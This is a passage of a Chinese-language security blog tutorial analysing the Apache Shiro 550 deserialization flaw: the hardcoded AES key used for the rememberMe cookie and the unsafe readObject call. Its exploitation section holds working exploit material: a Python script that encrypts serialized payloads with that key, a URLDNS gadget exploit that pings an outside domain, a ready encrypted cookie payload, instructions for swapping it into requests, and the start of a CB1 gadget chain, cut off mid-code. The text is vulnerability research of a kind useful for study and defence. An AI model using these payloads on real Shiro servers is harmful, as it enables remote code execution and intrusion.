+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> principals;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这个方法的返回值是<code>PrincipalCollection</code>，一般是用于聚合多个<code>Realm</code>配置的集合。</p><p>这段代码中可以看到将 HTTP 请求中的 Cookie 拿出来赋值给<code>bytes</code>数组，然后将<code>bytes</code>数组中的东西进行<code>convertBytesToPrincipals()</code>方法的调用，并赋值给<code>principals</code>。</p><p>继续看<code>convertBytesToPrincipals()</code>这个方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>protected</span> PrincipalCollection <span style=color:#a6e22e>convertBytesToPrincipals</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes, SubjectContext subjectContext) {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (getCipherService() <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>		bytes <span style=color:#f92672>=</span> decrypt(bytes);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> deserialize(bytes);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这个方法把之前的<code>bytes</code>数组转换成了认证信息，在这个方法中明确做了两件事，一个是进行解密，一个反序列化。</p><p>先看看解密的<code>decrypt()</code>方法。</p><h4 id=解密之decrypt>解密之<code>decrypt()</code>
+<a class=anchor href=#%e8%a7%a3%e5%af%86%e4%b9%8bdecrypt>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>decrypt</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> encrypted) {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> serialized <span style=color:#f92672>=</span> encrypted;
+</span></span><span style=display:flex><span>	CipherService cipherService <span style=color:#f92672>=</span> getCipherService();
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (cipherService <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>		ByteSource byteSource <span style=color:#f92672>=</span> cipherService.<span style=color:#a6e22e>decrypt</span>(encrypted, getDecryptionCipherKey());
+</span></span><span style=display:flex><span>		serialized <span style=color:#f92672>=</span> byteSource.<span style=color:#a6e22e>getBytes</span>();
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> serialized;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><code>getCipherService()</code>先获取密钥服务，返回一个 AES 加密服务实例，然后看<code>cipherService.decrypt()</code>。这是一个接口里的方法：<code>ByteSource decrypt(byte[] encrypted, byte[] decryptionKey) throws CryptoException;</code>。</p><p>第一个参数是要加密的数组，第二个参数是一个 key，这说明这是一个对称加密，重点关注这个 key。</p><p>回到<code>decrypt()</code>方法，传入两个参数，第一个是 Cookie，第二个是 key，跟进到传入的<code>getDecryptionCipherKey()</code>中。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>getDecryptionCipherKey</span>() {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> decryptionCipherKey;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>返回了<code>decryptionCipherKey</code>，找一下谁调用了它。结果找到了<code>setDecryptionCipherKey()</code>方法，再找谁调用了<code>setDecryptionCipherKey()</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setCipherKey</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> cipherKey) {
+</span></span><span style=display:flex><span>	<span style=color:#75715e>//Since this method should only be used in symmetric ciphers</span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>//(where the enc and dec keys are the same), set it on both:</span>
+</span></span><span style=display:flex><span>	setEncryptionCipherKey(cipherKey);
+</span></span><span style=display:flex><span>	setDecryptionCipherKey(cipherKey);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>AbstractRememberMeManager</span>() {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>serializer</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> DefaultSerializer<span style=color:#f92672>&lt;</span>PrincipalCollection<span style=color:#f92672>&gt;</span>();
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>cipherService</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> AesCipherService();
+</span></span><span style=display:flex><span>	setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>到这就发现了一个常量<code>DEFAULT_CIPHER_KEY_BYTES</code>，值是固定的：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> DEFAULT_CIPHER_KEY_BYTES <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>decode</span>(<span style=color:#e6db74>&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>);
+</span></span></code></pre></div><p>这里我们就发现 shiro 进行 Cookie 加密的 AES 算法是一个常量。</p><h4 id=deserialize反序列化><code>deserialize</code>反序列化
+<a class=anchor href=#deserialize%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96>#</a></h4><p>在之前<code>convertBytesToPrincipals()</code>这个方法来跟进。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>protected</span> PrincipalCollection <span style=color:#a6e22e>deserialize</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> serializedIdentity) {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> getSerializer().<span style=color:#a6e22e>deserialize</span>(serializedIdentity);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>T <span style=color:#a6e22e>deserialize</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> serialized) <span style=color:#66d9ef>throws</span> SerializationException;
+</span></span></code></pre></div><p>再跟进到 shiro 的<code>DefaultSerializer</code>类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> T <span style=color:#a6e22e>deserialize</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> serialized) <span style=color:#66d9ef>throws</span> SerializationException {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (serialized <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>		String msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;argument cannot be null.&#34;</span>;
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(msg);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	ByteArrayInputStream bais <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayInputStream(serialized);
+</span></span><span style=display:flex><span>	BufferedInputStream bis <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BufferedInputStream(bais);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>		ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassResolvingObjectInputStream(bis);
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>@SuppressWarnings</span>({<span style=color:#e6db74>&#34;unchecked&#34;</span>})
+</span></span><span style=display:flex><span>		T deserialized <span style=color:#f92672>=</span> (T) ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>		ois.<span style=color:#a6e22e>close</span>();
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> deserialized;
+</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>catch</span> (Exception e) {
+</span></span><span style=display:flex><span>		String msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Unable to deserialze argument byte array.&#34;</span>;
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SerializationException(msg, e);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这里调用了<code>readObject()</code>方法，所以这是一个很好的入口类。</p><p>至此，shiro 拿到 Cookie 的解密过程以及分析完毕，接下来看看这个 Cookie 是这么产生的，也就是加密过程。</p><h3 id=分析加密过程>分析加密过程
+<a class=anchor href=#%e5%88%86%e6%9e%90%e5%8a%a0%e5%af%86%e8%bf%87%e7%a8%8b>#</a></h3><p>断点打在<code>AbstractRememberMeManager</code>类的<code>onSuccessfulLogin</code>方法里。</p><p><img src=https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/rememberMeTrue.png alt=1></p><p>直接进入到<code>if (isRememberMe(token))</code>的判断里，判断<code>RememberMe</code>字段是否是<code>true</code>，然后调用<code>rememberIdentity()</code>方法。步入这个方法，调用各种方法，保存用户名。</p><p><img src=https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/indentify.png alt=2></p><p>然后回到<code>rememberIdentity()</code>方法。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>rememberIdentity</span>(Subject subject, PrincipalCollection accountPrincipals) {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> convertPrincipalsToBytes(accountPrincipals);
+</span></span><span style=display:flex><span>	rememberSerializedIdentity(subject, bytes);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>进入<code>convertPrincipalsToBytes()</code>方法，这里就是进行加密和序列化的地方。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>convertPrincipalsToBytes</span>(PrincipalCollection principals) {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> serialize(principals);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (getCipherService() <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>		bytes <span style=color:#f92672>=</span> encrypt(bytes);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> bytes;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>先看序列化的过程。</p><p><img src=https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/serializeDone.png alt=3></p><p>再来看加密的过程。</p><p><img src=https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/encryptCode.png alt=4></p><p>其实这里差不多就能看出来是加密算法是 AES 了，继续跟进，最后找到的加密 key 是一个常量。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>AbstractRememberMeManager</span>() {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>serializer</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> DefaultSerializer<span style=color:#f92672>&lt;</span>PrincipalCollection<span style=color:#f92672>&gt;</span>();
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>cipherService</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> AesCipherService();
+</span></span><span style=display:flex><span>	setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> DEFAULT_CIPHER_KEY_BYTES <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>decode</span>(<span style=color:#e6db74>&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>);
+</span></span></code></pre></div><p>后续就是拿到 AES 加密之后的 Cookie 进行 Base64 编码了。</p><p><img src=https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/Cookie.png alt=5></p><h2 id=漏洞利用>漏洞利用
+<a class=anchor href=#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8>#</a></h2><h3 id=漏洞利用思路>漏洞利用思路
+<a class=anchor href=#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af>#</a></h3><p>实现 RCE 或者反弹 shell，是在反序列化的时候触发的。那我们的攻击就是将反序列化的东西进行 shiro 的一系列加密操作，再把最后的 payload 替换请求包中的 RememberMe 字段的值。</p><p>这里附上大佬写的加密脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> email.mime <span style=color:#f92672>import</span> base
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pydoc <span style=color:#f92672>import</span> plain
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> turtle <span style=color:#f92672>import</span> mode
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> uuid
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> random <span style=color:#f92672>import</span> Random
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_file_data</span>(filename):
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>with</span> open(filename, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> data
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>aes_enc</span>(data):
+</span></span><span style=display:flex><span>	BS <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>block_size
+</span></span><span style=display:flex><span>	pad <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> s: s <span style=color:#f92672>+</span> ((BS <span style=color:#f92672>-</span> len(s) <span style=color:#f92672>%</span> BS) <span style=color:#f92672>*</span> chr(BS <span style=color:#f92672>-</span> len(s) <span style=color:#f92672>%</span> BS))<span style=color:#f92672>.</span>encode()
+</span></span><span style=display:flex><span>	key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>
+</span></span><span style=display:flex><span>	mode <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>MODE_CBC
+</span></span><span style=display:flex><span>	iv <span style=color:#f92672>=</span> uuid<span style=color:#f92672>.</span>uuid4()<span style=color:#f92672>.</span>bytes
+</span></span><span style=display:flex><span>	encryptor <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(base64<span style=color:#f92672>.</span>b64decode(key), mode, iv)
+</span></span><span style=display:flex><span>	ciphertext <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(iv <span style=color:#f92672>+</span> encryptor<span style=color:#f92672>.</span>encrypt(pad(data)))
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> ciphertext
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>aes_dec</span>(enc_data):
+</span></span><span style=display:flex><span>	enc_data <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(enc_data)
+</span></span><span style=display:flex><span>	unpad <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> s: s[:<span style=color:#f92672>-</span>s[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]]
+</span></span><span style=display:flex><span>	key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>
+</span></span><span style=display:flex><span>	mode <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>MODE_CBC
+</span></span><span style=display:flex><span>	iv <span style=color:#f92672>=</span> enc_data[:<span style=color:#ae81ff>16</span>]
+</span></span><span style=display:flex><span>	encryptor <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(base64<span style=color:#f92672>.</span>b64decode(key), mode, iv)
+</span></span><span style=display:flex><span>	plaintext <span style=color:#f92672>=</span> encryptor<span style=color:#f92672>.</span>decrypt(enc_data[<span style=color:#ae81ff>16</span>:])
+</span></span><span style=display:flex><span>	plaintext <span style=color:#f92672>=</span> unpad(plaintext)
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> plaintext
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>	data <span style=color:#f92672>=</span> get_file_data(<span style=color:#e6db74>&#34;ser.bin&#34;</span>)
+</span></span><span style=display:flex><span>	print(aes_enc(data))
+</span></span></code></pre></div><h4 id=urldns-链>URLDNS 链
+<a class=anchor href=#urldns-%e9%93%be>#</a></h4><p>由于 URLDNS 链不依赖于 CommonsCollections 包，只需要 JDK 的包就行，所以一般用于检测是否存在漏洞。</p><p>直接用以前写好的 EXP：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.net.URL;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>URLDNSEXP</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>URL,Integer<span style=color:#f92672>&gt;</span> hashmap<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;</span>URL,Integer<span style=color:#f92672>&gt;</span>();
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// 这里不要发起请求</span>
+</span></span><span style=display:flex><span>        URL url <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL(<span style=color:#e6db74>&#34;http://ewlslqofla.lfcx.eu.org&#34;</span>);
+</span></span><span style=display:flex><span>        Class c <span style=color:#f92672>=</span> url.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field hashcodefile <span style=color:#f92672>=</span> c.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;hashCode&#34;</span>);
+</span></span><span style=display:flex><span>        hashcodefile.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        hashcodefile.<span style=color:#a6e22e>set</span>(url,1234);
+</span></span><span style=display:flex><span>        hashmap.<span style=color:#a6e22e>put</span>(url,1);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span>
+</span></span><span style=display:flex><span>        hashcodefile.<span style=color:#a6e22e>set</span>(url,<span style=color:#f92672>-</span>1);
+</span></span><span style=display:flex><span>        serialize(hashmap);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//unserialize(&#34;ser.bin&#34;);</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> IOException {
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>unserialize</span>(String Filename) <span style=color:#66d9ef>throws</span> IOException, ClassNotFoundException{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(Filename));
+</span></span><span style=display:flex><span>        Object obj <span style=color:#f92672>=</span> ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> obj;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>然后把生成的 ser.bin 放到加密脚本里去进行加密：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-text data-lang=text><span style=display:flex><span>b&#39;RZjWFCvRTbaH2djNUcO9Fg+n1gR891pr+WiUcR8alNOWmmlzRt224JavzDUrXKwEUqX6bz9C4OWhBEIPEo0ss8yxqlU8QAQcFfcIhdF6XVedCEMP5dSi7hJNBt/QPF1aV2Z5Xugc1CLSpoYssEsGiib9WUsOAPwPxKGGpErbQ6L9hJR2nqAo4LAqHLytrZ/6Q/0Xsp6RJQ1p/1ey4sSnD8t3aG0Vlfn5DnhmyVOpkU+5wI7hc1cJD6mOitU2BojYlbK9F0ILqEbN/fHLLNsuGZycMrCDtoqejetOAAcqrTps4u2vu7ziquR/TyPfQ44RzCaPiEG96Eyqxz2tHKuNv6KIivWBi3Rxmb7f9RHRke7dnAymqrqgo6/PJy59eOAAzbOpD95/HgkS0RnIxkycE6t3xkgwBoPaIVtHwsmvDJ4+06YiH83Xxewto7YM5YFbhYBBZSbtr5dw0ELe9YO26M98O4ZWOHOK5BPCpvaAMvE=&#39;
+</span></span></code></pre></div><p>然后把加密后的数据替换请求包中的 RememberMe，并把 JSESSIONID 删除，因为当存在 JSESSIONID 时，会忽略 rememberMe。然后发包就是看到 DNS 请求的记录。</p><h4 id=cc11-链>CC11 链
+<a class=anchor href=#cc11-%e9%93%be>#</a></h4><p>这里就直接用 CC11的 EXP 来打就行：</p><p><img src=https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/CC11.png alt=8></p><h4 id=cb1-链>CB1 链
+<a class=anchor href=#cb1-%e9%93%be>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.beanutils.BeanComparator;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.beanutils.PropertyUtils;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.PriorityQueue;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setFieldValue</span>(Object obj,String fieldName,Object value) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        Field field <span style=color:#f92672>=</span> obj.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getDeclaredField</span>(fieldName);
+</span></span><span style=display:flex><span>        field.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        field.<span style=color:#a6e22e>set</span>(obj,value);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception {
